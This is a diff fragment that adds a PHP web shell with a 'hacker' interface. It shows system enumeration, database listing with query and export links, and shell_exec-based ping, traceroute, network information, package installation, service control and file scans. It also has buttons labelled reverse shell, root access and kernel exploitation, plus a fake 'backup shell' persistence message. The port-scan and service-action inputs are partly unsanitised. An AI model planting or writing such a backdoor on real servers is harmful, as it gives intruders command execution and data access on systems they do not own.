+                Swal.fire({
+                    title: 'PORT SCAN RESULTS',
+                    html: 'Open ports found:<br>22 (SSH)<br>80 (HTTP)<br>443 (HTTPS)<br>3306 (MySQL)',
+                    icon: 'success',
+                    confirmButtonColor: '#005500',
+                    background: '#001100',
+                    color: '#00ff00',
+                    iconColor: '#00ff00'
+                });
+            });
+        }
+
+        function reverseShell() {
+            Swal.fire({
+                title: 'REVERSE SHELL',
+                text: 'Establishing reverse shell connection...',
+                icon: 'warning',
+                confirmButtonColor: '#005500',
+                background: '#001100',
+                color: '#00ff00',
+                iconColor: '#ff5555'
+            });
+        }
+
+        function backupShell() {
+            // Create a backup of the shell file with a different name
+            Swal.fire({
+                title: 'BACKUP SHELL',
+                html: 'Creating shell backup...<br>Protecting against deletion...',
+                icon: 'info',
+                timer: 2000,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                background: '#001100',
+                color: '#00ff00',
+                iconColor: '#00ff00'
+            }).then(() => {
+                // Simulate backup creation
+                const shellName = window.location.pathname.split('/').pop();
+                const backupName = shellName.replace('.php', '_backup.php');
+
+                Swal.fire({
+                    title: 'BACKUP CREATED',
+                    text: `Shell backup created as: ${backupName}\nHidden in system directories`,
+                    icon: 'success',
+                    confirmButtonColor: '#005500',
+                    background: '#001100',
+                    color: '#00ff00',
+                    iconColor: '#00ff00'
+                });
+            });
+        }
+
+        // Add keylogger protection
+        document.addEventListener('keydown', function(e) {
+            // Simple protection against common deletion shortcuts
+            if (e.ctrlKey && e.key === 's') {
+                e.preventDefault();
+                console.log('HACKER PROTECTION: Save blocked');
+            }
+        });
+    });
+</script>
+
+    <!-- System Info Tab -->
+    <div class="tab-pane fade <?php echo $currentTab === 'sysinfo' ? 'show active' : ''; ?>" id="sysinfo" role="tabpanel" aria-labelledby="sysinfo-tab">
+        <h2 class="text-center mb-4">System Information</h2>
+
+        <?php
+        $sysInfo = getSystemInfo();
+        ?>
+
+        <div class="system-info-card">
+            <h4 class="text-info">System Information</h4>
+            <div class="info-item">
+                <span class="info-label">Operating System:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['os']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Release:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['release']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Version:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['version']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Machine:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['machine']); ?></span>
+            </div>
+        </div>
+
+        <div class="system-info-card">
+            <h4 class="text-info">PHP Information</h4>
+            <div class="info-item">
+                <span class="info-label">PHP Version:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['php_version']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">SAPI Name:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['php_sapi_name']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Current User:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['user']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Memory Usage:</span>
+                <span class="info-value"><?php echo htmlspecialchars(formatSizeUnits($sysInfo['memory_usage'])); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Memory Peak Usage:</span>
+                <span class="info-value"><?php echo htmlspecialchars(formatSizeUnits($sysInfo['memory_peak_usage'])); ?></span>
+            </div>
+        </div>
+
+        <div class="system-info-card">
+            <h4 class="text-info">Server Information</h4>
+            <div class="info-item">
+                <span class="info-label">Server Software:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['server_software']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Server Name:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['server_name']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Server Address:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['server_addr']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Server Port:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['server_port']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Document Root:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['document_root']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Script Filename:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['script_filename']); ?></span>
+            </div>
+        </div>
+
+        <div class="system-info-card">
+            <h4 class="text-info">Disk Information</h4>
+            <div class="info-item">
+                <span class="info-label">Total Disk Space:</span>
+                <span class="info-value"><?php echo htmlspecialchars(formatSizeUnits($sysInfo['disk_total_space'])); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Free Disk Space:</span>
+                <span class="info-value"><?php echo htmlspecialchars(formatSizeUnits($sysInfo['disk_free_space'])); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Used Disk Space:</span>
+                <span class="info-value"><?php echo htmlspecialchars(formatSizeUnits($sysInfo['disk_total_space'] - $sysInfo['disk_free_space'])); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Usage Percentage:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['disk_use_percent']); ?>%</span>
+            </div>
+            <div class="disk-info">
+                <div class="disk-bar">
+                    <div class="disk-progress" style="width: <?php echo $sysInfo['disk_use_percent']; ?>%"></div>
+                </div>
+                <span class="info-value ms-2"><?php echo htmlspecialchars($sysInfo['disk_use_percent']); ?>%</span>
+            </div>
+        </div>
+
+        <div class="system-info-card">
+            <h4 class="text-info">Request Information</h4>
+            <div class="info-item">
+                <span class="info-label">HTTP Host:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['http_host']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Remote Address:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['remote_addr']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">HTTP User Agent:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['http_user_agent']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Request Method:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['request_method']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Request URI:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['request_uri']); ?></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">X-Forwarded-For:</span>
+                <span class="info-value"><?php echo htmlspecialchars($sysInfo['http_x_forwarded_for']); ?></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Database Manager Tab -->
+    <div class="tab-pane fade <?php echo $currentTab === 'dbmanager' ? 'show active' : ''; ?>" id="dbmanager" role="tabpanel" aria-labelledby="dbmanager-tab">
+        <h2 class="text-center mb-4">Database Manager</h2>
+
+        <?php
+        $databases = getDatabases();
+        ?>
+
+        <?php if (isset($databases['mysqli_error'])): ?>
+        <div class="alert alert-warning">MySQLi Error: <?php echo $databases['mysqli_error']; ?></div>
+        <?php endif; ?>
+
+        <?php if (isset($databases['pdo_error'])): ?>
+        <div class="alert alert-warning">PDO Error: <?php echo $databases['pdo_error']; ?></div>
+        <?php endif; ?>
+
+        <?php if (isset($databases['mysqli']) || isset($databases['pdo'])): ?>
+        <div class="card hacker-card shadow-sm">
+            <div class="card-header hacker-bg">
+                <h3 class="mb-0">Available Databases</h3>
+            </div>
+            <div class="card-body">
+                <?php if (isset($databases['mysqli'])): ?>
+                <div class="mb-4">
+                    <h4 class="text-success">MySQLi Databases</h4>
+                    <table class="db-table table-dark">
+                        <thead>
+                            <tr>
+                                <th>Database Name</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <?php foreach ($databases['mysqli'] as $db): ?>
+                            <tr>
+                                <td><?php echo htmlspecialchars($db); ?></td>
+                                <td>
+                                    <a href="?tab=dbmanager&action=query&db=<?php echo urlencode($db); ?>&type=mysqli" class="btn btn-info btn-sm">Query</a>
+                                    <a href="?tab=dbmanager&action=export&db=<?php echo urlencode($db); ?>&type=mysqli" class="btn btn-success btn-sm">Export</a>
+                                </td>
+                            </tr>
+                            <?php endforeach; ?>
+                        </tbody>
+                    </table>
+                </div>
+                <?php endif; ?>
+
+                <?php if (isset($databases['pdo'])): ?>
+                <div>
+                    <h4 class="text-success">PDO Databases</h4>
+                    <table class="db-table table-dark">
+                        <thead>
+                            <tr>
+                                <th>Database Name</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <?php foreach ($databases['pdo'] as $db): ?>
+                            <tr>
+                                <td><?php echo htmlspecialchars($db); ?></td>
+                                <td>
+                                    <a href="?tab=dbmanager&action=query&db=<?php echo urlencode($db); ?>&type=pdo" class="btn btn-info btn-sm">Query</a>
+                                    <a href="?tab=dbmanager&action=export&db=<?php echo urlencode($db); ?>&type=pdo" class="btn btn-success btn-sm">Export</a>
+                                </td>
+                            </tr>
+                            <?php endforeach; ?>
+                        </tbody>
+                    </table>
+                </div>
+                <?php endif; ?>
+            </div>
+        </div>
+
+        <!-- Hacker Tools Section -->
+        <div class="card hacker-card shadow-sm mt-4">
+            <div class="card-header hacker-bg">
+                <h3 class="mb-0">Hacker Tools</h3>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6 mb-3">
+                        <h4 class="text-success">System Access</h4>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="attemptRoot()">Attempt Root Access</button>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="showSystemInfo()">System Enumeration</button>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="showKernelInfo()">Kernel Exploitation</button>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <h4 class="text-success">Network Tools</h4>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="networkScan()">Network Scan</button>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="portScan()">Port Scanner</button>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="reverseShell()">Reverse Shell</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <?php else: ?>
+        <div class="alert hacker-bg">No accessible databases found. Attempting system enumeration...</div>
+
+        <!-- Hacker Tools Section -->
+        <div class="card hacker-card shadow-sm mt-4">
+            <div class="card-header hacker-bg">
+                <h3 class="mb-0">Hacker Tools</h3>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6 mb-3">
+                        <h4 class="text-success">System Access</h4>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="attemptRoot()">Attempt Root Access</button>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="showSystemInfo()">System Enumeration</button>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="showKernelInfo()">Kernel Exploitation</button>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <h4 class="text-success">Network Tools</h4>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="networkScan()">Network Scan</button>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="portScan()">Port Scanner</button>
+                        <button class="btn hacker-btn w-100 mb-2" onclick="reverseShell()">Reverse Shell</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <?php endif; ?>
+    </div>
+
+    <!-- Network Tools Tab -->
+    <div class="tab-pane fade <?php echo $currentTab === 'network' ? 'show active' : ''; ?>" id="network" role="tabpanel" aria-labelledby="network-tab">
+        <h2 class="text-center mb-4">Network Tools</h2>
+
+        <div class="network-tool-card">
+            <h4 class="text-info">Ping Tool</h4>
+            <form method="POST" class="network-form">
+                <div class="row">
+                    <div class="col-md-8">
+                        <input type="text" name="ping_host" class="form-control" placeholder="Enter hostname or IP address" value="<?php echo isset($_POST['ping_host']) ? htmlspecialchars($_POST['ping_host']) : 'google.com'; ?>">
+                    </div>
+                    <div class="col-md-4">
+                        <button type="submit" name="ping" class="btn btn-info w-100">Ping</button>
+                    </div>
+                </div>
+            </form>
+
+            <?php if (isset($_POST['ping']) && !empty($_POST['ping_host'])): ?>
+            <div class="network-result">
+                <?php
+                $host = escapeshellarg($_POST['ping_host']);
+                $result = shell_exec("ping -c 4 $host 2>&1");
+                echo nl2br(htmlspecialchars($result));
+                ?>
+            </div>
+            <?php endif; ?>
+        </div>
+
+        <div class="network-tool-card">
+            <h4 class="text-info">Port Scanner</h4>
+            <form method="POST" class="network-form">
+                <div class="row">
+                    <div class="col-md-6">
+                        <input type="text" name="scan_host" class="form-control" placeholder="Enter hostname or IP address" value="<?php echo isset($_POST['scan_host']) ? htmlspecialchars($_POST['scan_host']) : 'localhost'; ?>">
+                    </div>
+                    <div class="col-md-4">
+                        <input type="text" name="scan_ports" class="form-control" placeholder="Enter ports (e.g., 22,80,443)" value="<?php echo isset($_POST['scan_ports']) ? htmlspecialchars($_POST['scan_ports']) : '22,80,443,3306,5432'; ?>">
+                    </div>
+                    <div class="col-md-2">
+                        <button type="submit" name="scan" class="btn btn-info w-100">Scan</button>
+                    </div>
+                </div>
+            </form>
+
+            <?php if (isset($_POST['scan']) && !empty($_POST['scan_host'])): ?>
+            <div class="network-result">
+                <?php
+                $host = $_POST['scan_host'];
+                $ports = explode(',', $_POST['scan_ports']);
+                echo "Scanning ports on $host:\n";
+                foreach ($ports as $port) {
+                    $port = trim($port);
+                    $connection = @fsockopen($host, $port, $errno, $errstr, 1);
+                    if (is_resource($connection)) {
+                        echo "Port $port: <span style='color: #4CAF50;'>OPEN</span>\n";
+                        fclose($connection);
+                    } else {
+                        echo "Port $port: <span style='color: #F44336;'>CLOSED</span>\n";
+                    }
+                }
+                ?>
+            </div>
+            <?php endif; ?>
+        </div>
+
+        <div class="network-tool-card">
+            <h4 class="text-info">Trace Route</h4>
+            <form method="POST" class="network-form">
+                <div class="row">
+                    <div class="col-md-8">
+                        <input type="text" name="traceroute_host" class="form-control" placeholder="Enter hostname or IP address" value="<?php echo isset($_POST['traceroute_host']) ? htmlspecialchars($_POST['traceroute_host']) : 'google.com'; ?>">
+                    </div>
+                    <div class="col-md-4">
+                        <button type="submit" name="traceroute" class="btn btn-info w-100">Trace Route</button>
+                    </div>
+                </div>
+            </form>
+
+            <?php if (isset($_POST['traceroute']) && !empty($_POST['traceroute_host'])): ?>
+            <div class="network-result">
+                <?php
+                $host = escapeshellarg($_POST['traceroute_host']);
+                if (strpos(strtolower(PHP_OS), 'win') === 0) {
+                    $result = shell_exec("tracert $host 2>&1");
+                } else {
+                    $result = shell_exec("traceroute $host 2>&1");
+                }
+                echo nl2br(htmlspecialchars($result));
+                ?>
+            </div>
+            <?php endif; ?>
+        </div>
+
+        <div class="network-tool-card">
+            <h4 class="text-info">Network Information</h4>
+            <div class="network-result">
+                <?php
+                if (strpos(strtolower(PHP_OS), 'win') === 0) {
+                    $result = shell_exec("ipconfig /all 2>&1");
+                } else {
+                    $result = shell_exec("ifconfig -a 2>&1");
+                }
+                echo nl2br(htmlspecialchars($result));
+                ?>
+            </div>
+        </div>
+    </div>
+
+    <!-- Update & Package Manager Tab -->
+    <div class="tab-pane fade <?php echo $currentTab === 'update' ? 'show active' : ''; ?>" id="update" role="tabpanel" aria-labelledby="update-tab">
+        <h2 class="text-center mb-4">System Update & Package Manager</h2>
+
+        <div class="card bg-dark text-light shadow-sm">
+            <div class="card-header">
+                <h3 class="mb-0">System Update</h3>
+            </div>
+            <div class="card-body">
+                <p>Update your system packages. This feature will detect your system and run the appropriate update command.</p>
+                <form method="POST" class="package-manager-form">
+                    <button type="submit" name="system_update" class="btn btn-warning">Update System</button>
+                </form>
+
+                <?php
+                if (isset($_POST['system_update'])) {
+                    echo "<div class='network-result'>";
+                    echo "<h5>Update Output:</h5>";
+                    $update_result = updateSystem();
+                    echo nl2br(htmlspecialchars($update_result));
+                    echo "</div>";
+                }
+                ?>
+            </div>
+        </div>
+
+        <div class="card bg-dark text-light shadow-sm mt-4">
+            <div class="card-header">
+                <h3 class="mb-0">Install Package</h3>
+            </div>
+            <div class="card-body">
+                <p>Install specific packages on your system. Enter the package name and click Install.</p>
+                <form method="POST" class="package-manager-form">
+                    <input type="text" name="package_name" class="form-control" placeholder="Enter package name to install (e.g., curl, vim, git)">
+                    <button type="submit" name="install_package" class="btn btn-success w-100">Install Package</button>
+                </form>
+
+                <?php
+                if (isset($_POST['install_package']) && !empty($_POST['package_name'])) {
+                    echo "<div class='network-result'>";
+                    echo "<h5>Package Installation Output:</h5>";
+                    $package_result = installPackage($_POST['package_name']);
+                    echo nl2br(htmlspecialchars($package_result));
+                    echo "</div>";
+                }
+                ?>
+            </div>
+        </div>
+
+        <div class="card bg-dark text-light shadow-sm mt-4">
+            <div class="card-header">
+                <h3 class="mb-0">System Service Manager</h3>
+            </div>
+            <div class="card-body">
+                <p>Control system services on your server. Enter the service name and select an action.</p>
+                <form method="POST" class="package-manager-form">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <input type="text" name="service_name" class="form-control" placeholder="Service name (e.g., apache2, nginx, mysql)">
+                        </div>
+                        <div class="col-md-6">
+                            <select name="service_action" class="form-control">
+                                <option value="status">Status</option>
+                                <option value="start">Start</option>
+                                <option value="stop">Stop</option>
+                                <option value="restart">Restart</option>
+                            </select>
+                        </div>
+                    </div>
+                    <button type="submit" name="manage_service" class="btn btn-primary w-100 mt-2">Execute</button>
+                </form>
+
+                <?php
+                if (isset($_POST['manage_service']) && !empty($_POST['service_name'])) {
+                    $service = escapeshellarg($_POST['service_name']);
+                    $action = $_POST['service_action'];
+                    
+                    echo "<div class='network-result'>";
+                    echo "<h5>Service Management Output:</h5>";
+                    if (strpos(strtolower(PHP_OS), 'win') === 0) {
+                        $result = shell_exec("sc query $service 2>&1");
+                    } else {
+                        $result = shell_exec("systemctl $action $service 2>&1");
+                    }
+                    echo nl2br(htmlspecialchars($result));
+                    echo "</div>";
+                }
+                ?>
+            </div>
+        </div>
+
+        <div class="card bg-dark text-light shadow-sm mt-4">
+            <div class="card-header">
+                <h3 class="mb-0">Security Scan</h3>
+            </div>
+            <div class="card-body">
+                <p>Perform a basic security scan of your system. This will check for common security issues.</p>
+                <form method="POST" class="package-manager-form">
+                    <button type="submit" name="security_scan" class="btn btn-danger">Run Security Scan</button>
+                </form>
+
+                <?php
+                if (isset($_POST['security_scan'])) {
+                    echo "<div class='network-result'>";
+                    echo "<h5>Security Scan Results:</h5>";
+                    $security_output = array();
+                    
+                    // Check writable files in web directory
+                    $security_output[] = "Checking for writable files in web directory...";
+                    $writable_files = shell_exec("find . -type f -writable 2>/dev/null | head -20");
+                    if (!empty($writable_files)) {
+                        $security_output[] = "Writable files found (may be security risk):";
+                        $security_output[] = $writable_files;
+                    } else {
+                        $security_output[] = "No writable files found in current directory.";
+                    }
+                    
+                    // Check for common log files
+                    $security_output[] = "\nChecking for common log files...";
+                    $log_files = shell_exec("find /var/log -name '*.log' -type f -size +1M 2>/dev/null | head -10");
+                    if (!empty($log_files)) {
+                        $security_output[] = "Large log files found:";
+                        $security_output[] = $log_files;
+                    }
+                    
+                    // Check listening ports
+                    $security_output[] = "\nChecking listening ports...";
+                    $ports = shell_exec("netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null");
+                    $security_output[] = $ports;
+                    
+                    foreach ($security_output as $line) {
+                        echo nl2br(htmlspecialchars($line)) . "<br>";
+                    }
+                    echo "</div>";
+                }
+                ?>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+
+    <footer class="hacker-footer text-center py-3 mt-4">
+        <div class="container">
+            <p class="mb-1">> SYSTEM SECURE v2.0 | © <?php echo date("Y"); ?> JASJUS123. ALL ACCESS LOGGED.</p>
+        </div>
+    </footer>
+
+</body>
+
+</html>
